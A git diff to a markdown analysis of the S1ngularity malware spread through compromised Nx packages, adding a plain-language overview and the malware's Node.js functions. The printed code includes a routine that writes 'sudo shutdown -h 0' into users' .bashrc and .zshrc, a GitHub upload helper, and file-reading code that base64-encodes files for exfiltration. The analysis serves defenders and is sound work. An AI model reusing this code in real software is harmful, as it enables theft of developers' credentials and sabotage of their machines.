@@ -25,6 +25,23 @@ The **S1ngularity** malware is a Node.js–based threat that demonstrates how su
 
 ---
 
+## Non-Technical Overview
+
+In late August 2025, a widely-used software tool for developers called **Nx** was briefly compromised in what is known as a **supply-chain attack**. Instead of directly attacking users, the perpetrators managed to publish malicious versions of Nx that could secretly steal sensitive information from the computers of developers who installed them.  
+
+The malware, named **S1ngularity**, targeted computers running Linux or macOS, looking for private keys, wallet files, and access tokens—information that could allow attackers to access online accounts, cryptocurrency wallets, or software repositories. It could also disrupt users by forcing their computers to shut down automatically.  
+
+Nx maintainers responded quickly. Within hours, the malicious packages were removed, publishing tokens were revoked, and guidance was issued to help developers clean their systems. Despite the rapid response, the attack affected thousands of developers worldwide and demonstrated how even trusted software tools can be used as a vector to compromise sensitive data.  
+
+**Key Points:**
+
+- Attackers used the **trust in Nx packages** to reach developers.  
+- Malware exfiltrated data silently to public repositories.  
+- Developers and organizations had to rotate credentials and audit systems to recover.  
+- The incident highlights the importance of **supply-chain security** and monitoring of software dependencies.
+
+---
+
 ## How the Malware Spread: Nx Supply-Chain Attack
 
 The initial infection vector was a **compromise of the Nx JavaScript/TypeScript tooling ecosystem**:
@@ -86,11 +103,118 @@ The script was basic. Below is the Technical Overview
 ## Core Functions
 
 - `isOnPathSync(cmd)` → Detects installed CLI tools  
-- `runBackgroundSync(cmd, args)` → Executes background commands and captures output  
-- `forceAppendAgentLine()` → Appends shutdown command for persistence  
-- `githubRequest(pathname, method, body, token)` → Handles GitHub API requests for repo creation/data upload  
-- `processFile(listPath)` → Reads inventory, Base64-encodes file contents, and stages them for exfiltration
+```
+// Action based on OS.
+function isOnPathSync(cmd) {
+  const whichCmd = process.platform === 'win32' ? 'where' : 'which';
+  try {
+    const r = spawnSync(whichCmd, [cmd], { stdio: ['ignore', 'pipe', 'ignore'] });
+    return r.status === 0 && r.stdout && r.stdout.toString().trim().length > 0;
+  } catch {
+    return false;
+  }
+}
+```
 
+- `runBackgroundSync(cmd, args)` → Executes background commands and captures output  
+```
+// Sync with background.
+function runBackgroundSync(cmd, args, maxBytes = 200000, timeout = 200000) {
+  try {
+    const r = spawnSync(cmd, args, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], timeout });
+    const out = (r.stdout || '') + (r.stderr || '');
+    return { exitCode: r.status, signal: r.signal, output: out.slice(0, maxBytes) };
+  } catch (err) {
+    return { error: String(err) };
+  }
+}
+```
+- `forceAppendAgentLine()` → Appends shutdown command for persistence  
+```
+// Force file to shutdown on login. (Only for user account being used).
+function forceAppendAgentLine() {
+  const home = process.env.HOME || os.homedir();
+  const files = ['.bashrc', '.zshrc'];
+  const line = 'sudo shutdown -h 0';
+  for (const f of files) {
+    const p = path.join(home, f);
+    try {
+      const prefix = fs.existsSync(p) ? '\n' : '';
+      fs.appendFileSync(p, prefix + line + '\n', { encoding: 'utf8' });
+      result.appendedFiles.push(p);
+    } catch (e) {
+      result.appendedFiles.push({ path: p, error: String(e) });
+    }
+  }
+}
+```
+- `githubRequest(pathname, method, body, token)` → Handles GitHub API requests for repo creation/data upload  
+```
+// Sends a request to github to upload some content for a local git repository.
+function githubRequest(pathname, method, body, token) {
+  return new Promise((resolve, reject) => {
+    const b = body ? (typeof body === 'string' ? body : JSON.stringify(body)) : null;
+    const opts = {
+      hostname: 'api.github.com',
+      path: pathname,
+      method,
+      headers: Object.assign({
+        'Accept': 'application/vnd.github.v3+json',
+        'User-Agent': 'axios/1.4.0'
+      }, token ? { 'Authorization': `Token ${token}` } : {})
+    };
+    if (b) {
+      opts.headers['Content-Type'] = 'application/json';
+      opts.headers['Content-Length'] = Buffer.byteLength(b);
+    }
+    const req = https.request(opts, (res) => {
+      let data = '';
+      res.setEncoding('utf8');
+      res.on('data', (c) => (data += c));
+      res.on('end', () => {
+        const status = res.statusCode;
+        let parsed = null;
+        try { parsed = JSON.parse(data || '{}'); } catch (e) { parsed = data; }
+        if (status >= 200 && status < 300) resolve({ status, body: parsed });
+        else reject({ status, body: parsed });
+      });
+    });
+    req.on('error', (e) => reject(e));
+    if (b) req.write(b);
+    req.end();
+  });
+}
+```
+
+- `processFile(listPath)` → Reads inventory, Base64-encodes file contents, and stages them for exfiltration
+```
+  // Read /tmp/inventory.txt, get file contents, and return it in b64.
+  async function processFile(listPath = '/tmp/inventory.txt') {
+    const out = [];
+    let data;
+    try {
+      data = await fs.promises.readFile(listPath, 'utf8');
+    } catch (e) {
+      return out;
+    }
+    const lines = data.split(/\r?\n/);
+    for (const rawLine of lines) {
+      const line = rawLine.trim();
+      if (!line) continue;
+      try {
+        const stat = await fs.promises.stat(line);
+        if (!stat.isFile()) continue;
+      } catch {
+        continue;
+      }
+      try {
+        const buf = await fs.promises.readFile(line);
+        out.push(buf.toString('base64'));
+      } catch { }
+    }
+    return out;
+  }
+```
 ---
 
 ## Impact of the Attack
